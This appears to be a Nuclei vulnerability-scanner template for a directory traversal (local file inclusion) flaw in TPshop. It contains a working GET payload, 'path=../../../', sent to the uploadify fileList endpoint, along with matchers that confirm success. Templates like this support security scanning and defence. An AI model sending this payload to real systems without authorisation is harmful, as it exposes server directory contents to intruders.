id: tpshop-directory-traversal

info:
  name: TPshop - Local File Inclusion
  author: pikpikcu
  severity: high
  description: TPshop is vulnerable to local file inclusion.
  reference:
    - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
  classification:
    cpe: cpe:2.3:a:tpshop:tpshop:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
    vendor: tpshop
    product: tpshop
  tags: tpshop,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../"

    matchers-condition: and
    matchers:
      - type: word
        name: tpshop
        cpe: cpe:2.3:a:tpshop:tpshop:*:*:*:*:*:*:*:*
        words:
          - '"state":"SUCCESS"'

      - type: status
        status:
          - 200
